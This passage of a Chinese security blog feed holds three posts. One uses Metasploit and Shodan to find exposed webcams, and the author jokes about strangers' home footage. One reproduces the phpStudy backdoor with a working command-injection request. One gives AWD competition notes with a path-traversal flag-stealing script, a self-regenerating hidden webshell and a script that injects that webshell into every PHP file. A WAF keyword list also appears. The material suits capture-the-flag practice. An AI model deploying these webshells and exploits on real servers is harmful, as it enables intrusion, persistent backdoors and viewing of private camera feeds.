title="利用MSF+Shadon搜索网络摄像头"></a>利用MSF+Shadon搜索网络摄像头</h2><p>看到一个好玩的，玩一下。</p><p>MSF我一直很喜欢~</p><p><code>auxiliary/gather/shodan_search</code>模块：</p><p><img src="4.png" alt></p><p><code>SHODAN_APIKEY</code>从官网看；<br><code>QUERY</code>查询的设备为<code>webcamxp</code></p><p>运行：<br><img src="5.png" alt></p><p>随便点几个看看：</p><p><img src="6.png" alt><br>大叔肚子有点大啊。。</p><p><img src="7.png" alt><br>貌似监控某个设备</p><p><img src="8.png" alt><br>实验室的设备？？</p><p><img src="9.png" alt><br>嘿嘿，居住区了</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.iyunv.com/thread-392144-1-1.html" target="_blank" rel="noopener">https://www.iyunv.com/thread-392144-1-1.html</a></p><p><a href="https://klionsec.github.io/2014/12/15/shodan-hacking/" target="_blank" rel="noopener">熟练利用 shodan hacking 辅助我们快速渗透[ 大中型目标 ]</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5MjMwNDYxNw==&amp;mid=2247483657&amp;idx=1&amp;sn=f9de9948f4255ecea6f75f7060418a4a&amp;chksm=fe20818fc9570899cd7fa0eb24e90db5c7a3cdbcee69ffef589c3c7e76e7c99be0c708ed5115&amp;mpshare=1&amp;scene=23&amp;srcid=1118FG5Hd7otDeHSb4c6j8LP&amp;sharer_sharetime=1574008055044&amp;sharer_shareid=3291101a2a6d966b2b8feb2b3fde94bf#rd" target="_blank" rel="noopener">利用MSF+Shadon搜索网络摄像头</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>phpstudy后门分析与复现</title>
      <link href="/passages/phpstudy%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>/passages/phpstudy%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>我号没了</p></blockquote><a id="more"></a><h2 id="phpstudy简介"><a href="#phpstudy简介" class="headerlink" title="phpstudy简介"></a>phpstudy简介</h2><p>phpStudy是一个PHP调试环境的程序集成包。该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer，一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境。该程序不仅包括PHP调试环境，还包括了开发工具、开发手册等。</p><p><strong>威胁等级</strong>：<font color="red">严重</font><br><strong>影响范围</strong>：phpstudy2016版、2018版<br><strong>后门类型</strong>：C&amp;C、命令执行<br><strong>利用难度</strong>：极易</p><p>目前已知受影响的phpstudy版本：</p><ul><li>phpstudy 2016版php-5.4</li><li>phpstudy 2018版php-5.2.17</li><li>phpstudy 2018版php-5.4.45</li></ul><h2 id="后门模块分析"><a href="#后门模块分析" class="headerlink" title="后门模块分析"></a>后门模块分析</h2><p>含后门的模块位置：<code>\ext\php_xmlrpc.dll</code>，至少在两个版本中存在该后门。<br><img src="./Snipaste_2019-09-25_09-51-44.png" alt></p><p>快速判断该模块中是否存在后门方法：<code>记事本打开该.dll文件，搜索eval字符串</code>，显示如下结果：<br><img src="./Snipaste_2019-09-25_09-54-23.png" alt></p><p>后门包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">accept-charset: c3lzdGVtKCd3aG9hbWknKTs=/*这里就是要执行的命令base64加密*/</span><br><span class="line">Connection: close</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>开启我的phpstudy<br>哦豁，火绒是真的nb，病毒库更新这么迅速<br><img src="./火绒病毒库1.png" alt><br><img src="./火绒病毒库2.png" alt></p><p>但火绒未免也太小气了，病毒竟然命名为<code>FakeStudy</code><br>phpstudy用的还是很舒服的。</p><p>添加一下<code>信任区</code>，继续我的复现之旅。</p><p>发个包过去瞅瞅：<br><img src="./Snipaste_2019-09-25_10-25-42.png" alt><br>哦豁，完蛋，我号没了:(<br><img src="./http___img04_sogoucdn_com_app_a_200678_e185e822b3.jpg" alt></p><h2 id="自动化利用"><a href="#自动化利用" class="headerlink" title="自动化利用"></a>自动化利用</h2><p>上面那样利用还是不够爽，<del>写个python自动化脚本吧</del>！<br>批量利用脚本链接：<a href="https://www.cnblogs.com/-qing-/p/11575622.html" target="_blank" rel="noopener">https://www.cnblogs.com/-qing-/p/11575622.html</a></p><p>脚本演示：<br><img src="./Snipaste_2019-09-25_10-30-36.png" alt><br>工具一把梭就是舒服，脚本小子实锤了。</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ul><li>删除存在后门的模块</li><li>更新phpstudy到最新的2019版本</li><li><del>卸载phpstudy</del></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>AWD攻略笔记</title>
      <link href="/passages/AWD%E6%94%BB%E7%95%A5%E7%AC%94%E8%AE%B0/"/>
      <url>/passages/AWD%E6%94%BB%E7%95%A5%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>AWD真好玩</p></blockquote><a id="more"></a><blockquote><p>开局一张图，内容全靠编</p></blockquote><p><img src="./awd.png" alt></p><h2 id="AWD是什么"><a href="#AWD是什么" class="headerlink" title="AWD是什么"></a>AWD是什么</h2><p><code>Attack With Defence</code>，简而言之就是你既是一个<code>hacker</code>，又是一个<code>manager</code>。<br><strong>比赛形式：</strong><br>一般就是一个ssh对应一个web或者pwn或者其他服务，然后flag若干分钟一轮，各队一般都有自己的初始分数，flag被拿会被拿走flag的队伍均分，主办方会对每个队伍的服务是否正常进行check，check不过就扣分，扣除的分值由服务check正常的队伍均分。</p><h2 id="AWD题目类型"><a href="#AWD题目类型" class="headerlink" title="AWD题目类型"></a>AWD题目类型</h2><h3 id="题目类型"><a href="#题目类型" class="headerlink" title="题目类型"></a>题目类型</h3><blockquote><p>只了解web的哭了</p></blockquote><ol><li>出题人自己写的或者修改的cms，附加了一些常见web漏洞。</li><li>常见或者不常见的cms。</li><li>一些框架漏洞，比如thinkphp，flask这种。</li></ol><h3 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h3><p>基本上web常见漏洞都会有，pwn爷爷和其他的就不清楚了。</p><h3 id="出题人思路"><a href="#出题人思路" class="headerlink" title="出题人思路"></a>出题人思路</h3><p>一般来说比较多见的是某些cms漏洞，为了减少现场挖洞的难度，一般出题人会放置一些很明显的漏洞代码，获取一些常用的web工具（漏洞工具），等等，再放几个比较简单的洞，直接在index.php或者web根目录下放个一句话木马。</p><h2 id="如何攻击"><a href="#如何攻击" class="headerlink" title="如何攻击"></a>如何攻击</h2><blockquote><p>AWD模式的比赛跟日常的渗透测试有共同之处。</p></blockquote><h3 id="如何拿flag"><a href="#如何拿flag" class="headerlink" title="如何拿flag"></a>如何拿flag</h3><p>一般来说就是以下两种模式：</p><ul><li>向内网一台机器发送http请求，<strong>返回请求中包含flag。</strong></li><li>又例如<strong>系统根目录下放置flag文件。</strong></li></ul><h3 id="一个良好的竞赛者需要的品质"><a href="#一个良好的竞赛者需要的品质" class="headerlink" title="一个良好的竞赛者需要的品质"></a>一个良好的竞赛者需要的品质</h3><ul><li><strong>快速的漏洞反应能力。</strong>因为有的时候，一些比赛放的漏洞都是网上能查到的，所以这个时候需要一个好的搜索技巧。或者是一些rec显而易见的那种。</li><li><strong>快速编写脚本的能力。</strong>因为大家的服务都是一样的，而你如果能通过比如注入的方式拿到flag，如果用hackbar一个个去弄，显然不够优雅，而且有时候特别会容易遗漏，那么这个时候写个<code>小python脚本</code>无疑是极好的。</li></ul><h2 id="如何防守"><a href="#如何防守" class="headerlink" title="如何防守"></a>如何防守</h2><blockquote><p>其实防守更多看的是谁比较细心。适合运维人员。</p></blockquote><ul><li><p>比赛开始的加固阶段<br>  比赛开始时，当我们连上ssh的时候，我们首先应该做的是修改一下服务器密码（有时候不需要），然后把源码down下来，及时做好备份。以方便进行代码审计。然后在尽量不违反主办方赛事的原则下挂上自己的waf，以及删除一些敏感性的文件或者数据等。在比赛开放攻击的时候需要我们自己去抓流量。监控网站日志等信息，以做好应急响应。<br>修改常见的一些弱口令密码，像网站后台密码等，如果能有权限对系统、web容器、数据库配置做一些更改的话，进行相应的加固操作。数据库密码一般在网站的配置文件中可以看到，对数据库做了密码更改等操作也需要修改配置文件，以保证网站能正常运行。</p></li><li><p>接下来的工作<br>  当然是审计，审计，再审计。挖掘漏洞。</p></li><li><p>当发现被攻击时<br>  当发现自己被打时，首先尝试还原以前的备份(记得备份当前)，如果依然被打，这个时候应该跟队友分好工，查看抓取的流量以及查看服务器上是不是存在shell。</p></li></ul><h2 id="附上小脚本："><a href="#附上小脚本：" class="headerlink" title="附上小脚本："></a>附上小脚本：</h2><h3 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h3><p>各种<code>不死马</code>、<code>内存马</code>啥的，都可以派上用场。这里就不展示了。</p><h3 id="日志记录"><a href="#日志记录" class="headerlink" title="日志记录"></a>日志记录</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 日志记录脚本 --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">date_default_timezone_set(<span class="string">"Asia/Shanghai"</span>);</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];      <span class="comment">//记录访问者的IP</span></span><br><span class="line">$filename = $_SERVER[<span class="string">'PHP_SELF'</span>];   <span class="comment">//访问者要访问的文件名</span></span><br><span class="line">$parameter = $_SERVER[<span class="string">'QUERY_STRING'</span>]；     <span class="comment">//访问者要请求的参数</span></span><br><span class="line">$time = date(<span class="string">'Y-m-d H:i:s'</span>, time());        <span class="comment">//访问时间</span></span><br><span class="line">$logadd = <span class="string">'访问时间：'</span>.$time.<span class="string">'--&gt;'</span>.<span class="string">'访问链接：'</span>.<span class="string">'http://'</span>.$ip.$filename.<span class="string">'?'</span>.$parameter.<span class="string">"\r\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//log记录</span></span><br><span class="line">$fh = fopen(<span class="string">"log.txt"</span>, <span class="string">"a"</span>);</span><br><span class="line">fwrite($fh, $logadd);</span><br><span class="line">fclose($fh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="简单的waf示例"><a href="#简单的waf示例" class="headerlink" title="简单的waf示例"></a>简单的waf示例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    define(<span class="string">'LOG_FILENAME'</span>,<span class="string">'log.txt'</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!function_exists(<span class="string">'getallheaders'</span>)) &#123;</span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">getallheaders</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">foreach</span> ($_SERVER <span class="keyword">as</span> $name =&gt; $value) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (substr($name, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">'HTTP_'</span>)</span><br><span class="line">                        $headers[str_replace(<span class="string">' '</span>, <span class="string">'-'</span>, ucwords(strtolower(str_replace(<span class="string">'_'</span>, <span class="string">' '</span>, substr($name, <span class="number">5</span>)))))] = $value;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> $headers;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $get = $_GET;</span><br><span class="line">        $post = $_POST;</span><br><span class="line">        $cookie = $_COOKIE;</span><br><span class="line">        $header = getallheaders();</span><br><span class="line">        $files = $_FILES;</span><br><span class="line">        $ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">        $method = $_SERVER[<span class="string">'REQUEST_METHOD'</span>];</span><br><span class="line">        $filepath = $_SERVER[<span class="string">"SCRIPT_NAME"</span>];</span><br><span class="line">        <span class="comment">//rewirte shell which uploaded by others, you can do more</span></span><br><span class="line">        <span class="keyword">foreach</span> ($_FILES <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            $files[$key][<span class="string">'content'</span>] = file_get_contents($_FILES[$key][<span class="string">'tmp_name'</span>]);</span><br><span class="line">            file_put_contents($_FILES[$key][<span class="string">'tmp_name'</span>], <span class="string">"virink"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">unset</span>($header[<span class="string">'Accept'</span>]);<span class="comment">//fix a bug</span></span><br><span class="line">        $input = <span class="keyword">array</span>(<span class="string">"Get"</span>=&gt;$get, <span class="string">"Post"</span>=&gt;$post, <span class="string">"Cookie"</span>=&gt;$cookie, <span class="string">"File"</span>=&gt;$files, <span class="string">"Header"</span>=&gt;$header);</span><br><span class="line">        <span class="comment">//deal with</span></span><br><span class="line">        $pattern = <span class="string">"select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex"</span>;</span><br><span class="line">        $pattern .= <span class="string">"|file_put_contents|fwrite|curl|system|eval|assert"</span>;</span><br><span class="line">        $pattern .=<span class="string">"|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore"</span>;</span><br><span class="line">        $pattern .=<span class="string">"|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec"</span>;</span><br><span class="line">        $vpattern = explode(<span class="string">"|"</span>,$pattern);</span><br><span class="line">        $bool = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($input <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">foreach</span>($vpattern <span class="keyword">as</span> $value)&#123;</span><br><span class="line">                <span class="keyword">foreach</span> ($v <span class="keyword">as</span> $kk =&gt; $vv) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (preg_match( <span class="string">"/$value/i"</span>, $vv ))&#123;</span><br><span class="line">                        $bool = <span class="keyword">true</span>;</span><br><span class="line">                        logging($input);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>($bool) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>($bool) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">logging</span><span class="params">($var)</span></span>&#123;</span><br><span class="line">        file_put_contents(LOG_FILENAME, <span class="string">"\r\n"</span>.time().<span class="string">"\r\n"</span>.print_r($var, <span class="keyword">true</span>), FILE_APPEND);</span><br><span class="line">        <span class="comment">// die() or unset($_GET) or unset($_POST) or unset($_COOKIE);</span></span><br><span class="line">    &#125;</span><br><span class="line">    waf();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr><hr><hr><p>再更新：</p><p>之前也受星盟安全团队邀请，玩过几次AWD，再记录下。</p><h2 id="比赛开始"><a href="#比赛开始" class="headerlink" title="比赛开始"></a>比赛开始</h2><p>相关条目来自郁离歌大哥的经验：<a href="http://yulige.top/?p=394" target="_blank" rel="noopener">http://yulige.top/?p=394</a></p><ul><li><p>0X01 改ssh密码（如果是默认的就改）</p></li><li><p>0X02 dump源码<br>  进入<code>/var/www/html</code>目录下，执行命令<code>zip -qr www.zip</code>。<br>  还原的时候，先进入<code>/var/www/html</code>目录下，再执行命令<code>unzip www.zip</code>，<code>unzip -l www.zip</code>用于查看压缩文件中包含的文件。</p><p>  可恨的是原始的靶机有时候并没有预置<code>zip</code>命令。还是MobaXtern这种自带ftp的ssh工具好用。</p></li><li><p>0X03 修改数据库密码和备份数据库</p><ol><li><p>修改密码：</p><blockquote><p>set password for root@localhost = password(‘新密码’);</p></blockquote></li><li><p>备份</p><blockquote><p>mysqldump -uroot -p密码 –databases 根据配置文件确定数据库 &gt; aaa.sql</p></blockquote><p>备份全部数据库</p><blockquote><p>mysqldump -uroot -p密码 –all-databases &gt; /tmp/all.sql</p></blockquote></li><li><p>还原</p><blockquote><p>mysql -uroot -p密码 &lt; aaa.sql</p></blockquote><p>注意是否已经建立了数据库。</p></li></ol></li><li><p>0X04 拿到源码之后先D盾查杀</p></li><li><p>0X05. seay扫洞（没啥大用处，一般题目代码量不会很大）</p></li><li><p>0X06. 上监控脚本</p></li><li><p>0X07. 审计</p></li><li><p>0X08. 时刻关注流量和积分榜</p></li><li><p>0X09. 写脚本批量拿分和提交</p></li></ul><h2 id="批量获取flag和提交的脚本"><a href="#批量获取flag和提交的脚本" class="headerlink" title="批量获取flag和提交的脚本"></a>批量获取flag和提交的脚本</h2><p><strong>（视比赛平台而定）</strong></p><p>关于自动提交flag函数中的headers，应该只要<code>Content-Type</code>和<code>Cookie</code>就行。视情况而定吧，实在不能自动提交，就抓包把所有的请求头都写上。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit_flag</span><span class="params">(flag)</span>:</span></span><br><span class="line">    url = <span class="string">'http://39.100.119.37:10000/commit/flag'</span></span><br><span class="line">    headers = &#123;<span class="string">'Host'</span>: <span class="string">'39.100.119.37:10000'</span>,<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0'</span>,<span class="string">'Accept'</span>: <span class="string">'application/json, text/javascript, */*; q=0.01'</span>,<span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span>,<span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,<span class="string">'Content-Type'</span>: <span class="string">'application/json; charset=UTF-8'</span>,<span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span>,<span class="string">'Connection'</span>: <span class="string">'close'</span>,<span class="string">'Referer'</span>: <span class="string">'http://39.100.119.37:10000/admin'</span>,<span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=7loc4cqkqudv3v0g85a0h77586'</span>&#125;</span><br><span class="line">    data = <span class="string">'&#123;"flag":"'</span> + flag + <span class="string">'","token":"8c7889befd2f3bf81d23e0f0b4a9c831"&#125;'</span></span><br><span class="line">    print(data)</span><br><span class="line">    <span class="comment"># data1 = str('&#123;"flag":"&#123;&#125;"').format(flag)+',"token":"8c7889befd2f3bf81d23e0f0b4a9c831"&#125;' #语法错误</span></span><br><span class="line">    req = requests.post(url,data=data,headers=headers)</span><br><span class="line">    print(req.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_by_post</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">13</span>):</span><br><span class="line"><span class="keyword">if</span> _ &lt;<span class="number">10</span>:</span><br><span class="line">_ = <span class="string">'0'</span>+ str(_)</span><br><span class="line">_ = str(_)</span><br><span class="line">url = <span class="string">'http://47.56.9.150:1&#123;&#125;80/download.php'</span>.format(_)</span><br><span class="line">post_data = &#123;<span class="string">'filename'</span>:<span class="string">'../../../../flag'</span>&#125;</span><br><span class="line">print(url)</span><br><span class="line">req = requests.post(url=url,data=post_data)</span><br><span class="line"><span class="keyword">if</span> req.status_code ==<span class="number">404</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">submit_flag(req.text)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 如果要处理异常，函数可以这样写（但submit_flag如果出现异常，则无法得知，推荐先用上面的函数）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_by_post2</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">13</span>):</span><br><span class="line"><span class="keyword">if</span> _ &lt;<span class="number">10</span>:</span><br><span class="line">_ = <span class="string">'0'</span>+ str(_)</span><br><span class="line">_ = str(_)</span><br><span class="line">url = <span class="string">'http://47.56.9.150:1&#123;&#125;80/download.php'</span>.format(_)</span><br><span class="line">post_data = &#123;<span class="string">'filename'</span>:<span class="string">'../../../../flag'</span>&#125;</span><br><span class="line">print(url)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">req = requests.post(url,data=data)</span><br><span class="line"><span class="keyword">if</span> req.status_code == <span class="number">404</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">submit_flag(req.text)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">print(e)</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h2 id="一些tip"><a href="#一些tip" class="headerlink" title="一些tip"></a>一些tip</h2><p>如果遇到<strong>冰蝎马</strong>这种后门，是不能直接写脚本批量获取flag的，这时候就要尽快通过冰蝎连接shell，种下<code>不死马</code>。</p><p>D盾扫出来的后门毕竟一下就被修复了。还需要队员进行全盘的代码审计，如<code>文件读取</code>，<code>万能密码绕过登录</code>，<code>文件上传</code>，<code>反序列化</code>等等。拿到一个权限后，就批量打一会，再种个不死马维持一下。</p><h2 id="不死马-内存马"><a href="#不死马-内存马" class="headerlink" title="不死马/内存马"></a>不死马/内存马</h2><p>保存为 <code>.index.php</code>隐藏文件，上传到对方服务器，然后浏览器访问去触发，就会生成 <code>.config.php</code>隐藏文件。<br>杀死进程或者重启apache会失效</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);  <span class="comment">//永久执行，直到进程结束</span></span><br><span class="line">ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//访问后，用户关闭url，进程不断，继续执行</span></span><br><span class="line"></span><br><span class="line">$path = dirname(<span class="keyword">__FILE__</span>);</span><br><span class="line">$file = $path . <span class="string">'/.config.php'</span>; <span class="comment">//生成恶意的隐藏文件（Linux系统）</span></span><br><span class="line">$shell = <span class="string">"&lt;?php if (md5(\$_REQUEST['pass'])==='91b37b09623a404b281e69932abb97df')&#123;@eval(\$_REQUEST['code']);@system(\$_REQUEST['sys']);exit();&#125; ?&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">        file_put_contents($file, $shell);</span><br><span class="line">        system(<span class="string">'chmod 777 .config.php;'</span>);</span><br><span class="line"></span><br><span class="line">        usleep(<span class="number">15000000</span>);  <span class="comment">//微秒级别，中间隔15秒迷惑对方</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>即使删除了<code>.config.php</code>，15秒后也会出现；即使删除了<code>.index.php</code>，<code>.config.php</code>文件15秒后还是会出现（亲测）。<br>(在原作者基础上加入了目录限制)</p><h2 id="在目录下的所有PHP文件前加木马"><a href="#在目录下的所有PHP文件前加木马" class="headerlink" title="在目录下的所有PHP文件前加木马"></a>在目录下的所有PHP文件前加木马</h2><p>星盟周年庆的时候看到别人的骚思路，自己写了个类似的功能。<br>文件命名为<code>aa.php</code><br>密码是<code>不能告诉你</code>，每次比赛都要换一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$shell = <span class="string">"&lt;?php if (md5(\$_REQUEST['pass'])==='91b37b09623a404b281e69932abb97df')&#123;@eval(\$_REQUEST['code']);@system(\$_REQUEST['sys']);exit();&#125; ?&gt;"</span>.<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(glob(<span class="string">'*.*'</span>) <span class="keyword">as</span> $filename)&#123;</span><br><span class="line"><span class="keyword">if</span> ($filename != <span class="string">"aa.php"</span>)&#123;</span><br><span class="line">$content = file_get_contents($filename);</span><br><span class="line">$content = $shell.$content;</span><br><span class="line">unlink($filename);</span><br><span class="line">file_put_contents($filename, $content);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只针对<code>aa.php</code>文件下的所有PHP文件。</p><hr><p>next to Do：</p><p><strong>一个好的waf</strong>、<strong>一个流量审计的脚本</strong></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vulhub练习笔记</title>
      <link href="/passages/vulhub%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/passages/vulhub%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
